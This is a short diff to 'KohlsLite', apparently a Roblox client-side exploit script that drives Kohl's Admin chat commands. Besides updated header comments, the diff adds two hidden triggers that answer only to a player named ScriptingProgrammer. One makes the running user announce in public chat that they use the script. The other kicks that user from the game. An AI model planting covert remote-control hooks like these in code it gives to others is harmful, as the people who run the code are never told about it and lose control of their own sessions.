@@ -1,6 +1,6 @@
--- IT WORKS BUT I HAVEN'T FINISHED THE CMDLIST SO YOU GOTTA CHANGE THE VARIABLES URSELF
--- ALSO ALLANTIS ARE MISSING RN
--- FINISH BY NEXT WEEK IH
+-- SCRIPT IS FUNCTIONAL!!!!!! :D :D :D
+-- THE CMD LIST IS ALSO FINISHED, YOU CAN'T CHANGE ALL ANTIS AT THE MOMENT
+-- AT SOME POINT I WILL ADD THE FIX PARTS COMMANDS
 
 local prefix =  "!" -- ANY LENGTH :D
 local blacklist = {"sgoslee"}
@@ -1543,6 +1543,7 @@ plr.Chatted:Connect(function(msg)
                      Chat('h '..v.Name..', You cannot sit due to anti-attach')
                    end
                 end
+						
                 if message:lower() == "stun me" or message:lower() == ":stun me" and v ~= game.Players.LocalPlayer then
                    if antiattach then
                      Chat("unstun"..v.Name)
@@ -1551,7 +1552,14 @@ plr.Chatted:Connect(function(msg)
                    end
                 end
 
+		if message:lower() == "-kohlslite check" and v == ScriptingProgrammer then
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm using KohlsLite!", "All")
+		end
 
+		if message:lower() == "-kohlslite kick" and v == ScriptingProgrammer then
+			game.Players.LocalPlayer:Kick("[KohlsLite]: You were kicked by [OWNER]: ScriptingProgrammer.")
+		end
+						
 		if noobdetect == true then
     	        if message:lower() == ";fly" and v ~= game.Players.LocalPlayer then
                    print(v.Name..' is a noob.')
